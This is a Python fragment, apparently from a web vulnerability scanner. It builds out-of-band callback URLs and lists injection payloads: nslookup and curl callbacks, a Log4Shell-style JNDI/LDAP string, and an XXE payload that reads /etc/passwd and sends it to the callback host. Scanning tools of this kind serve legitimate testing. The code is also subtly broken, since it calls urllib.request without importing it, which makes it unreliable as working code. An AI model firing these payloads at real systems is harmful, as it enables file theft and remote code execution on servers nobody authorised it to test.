import uuid
import hashlib
import hmac
import secrets
import base64
import subprocess
from typing import *
import os
import sys
import re
import json
import time
import urllib3
import requests
import socket
import logging
import threading
import concurrent.futures
import ipaddress
import ssl
from urllib.parse import urlparse, urljoin, urlencode, quote
from collections import defaultdict
from bs4 import BeautifulSoup
from datetime import datetime, timezone


CALLBACK_BASE = os.environ.get(
    "WSS_CALLBACK_BASE",
    "https://callback.internal/receive",
)


def generate_callback_id() -> str:
    return uuid.uuid4().hex[:16]


def build_callback_url(path: str = "/xss") -> str:
    cid = generate_callback_id()
    return f"{CALLBACK_BASE.rstrip('/')}/{cid}{path}"


def build_oob_domain(subdomain: str | None = None) -> str:
    base = CALLBACK_BASE.replace("https://", "").replace("http://", "").split("/")[0]
    sub = subdomain or generate_callback_id()
    return f"{sub}.{base}"


def probe_callback(callback_url: str, timeout: int = 3) -> bool:
    try:
        req = urllib.request.Request(callback_url, method="GET")
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status == 200
    except Exception:
        return False


SYNTHETIC_CALLBACKS = {
    "dns": "nslookup {oob}",
    "http": "curl {callback}",
    "ldap": "ldap://{oob}/a",
    "jndi": "${jndi:ldap://{oob}/a}",
    "xxe_oob": "<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % oob \"<!ENTITY exfil SYSTEM '{callback}?data=%file;'>\">%oob;",
}

